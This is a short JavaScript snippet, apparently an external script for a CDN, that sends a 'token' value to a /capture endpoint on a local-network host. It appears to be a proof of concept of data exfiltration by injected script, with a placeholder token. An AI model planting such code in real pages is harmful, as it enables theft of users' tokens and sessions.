// File hosted on https://cdn.jsdelivr.net/your-external-script.js
(function() {
    var xhr = new XMLHttpRequest();
    var token = 'test';
    xhr.open('GET', 'http://192.168.0.102:8000/capture?token=' + encodeURIComponent(token), true);
    xhr.send();
  })();
  
